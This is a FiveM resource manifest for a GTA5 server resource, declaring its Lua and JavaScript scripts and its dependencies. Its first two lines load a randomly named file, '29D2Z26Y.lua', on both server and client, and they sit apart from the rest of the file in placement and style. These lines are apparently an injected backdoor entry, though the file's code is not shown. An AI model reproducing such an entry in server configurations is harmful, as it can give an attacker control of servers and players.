server_script "29D2Z26Y.lua"
client_script "29D2Z26Y.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")
server_script("@oxmysql/lib/MySQL.lua")

shared_scripts({
	"shared/**/*.lua",
})

client_scripts({
	"client/**/*.lua",
	"client/gizmo.js",
})

server_scripts({
	"server/**/*.lua",
})
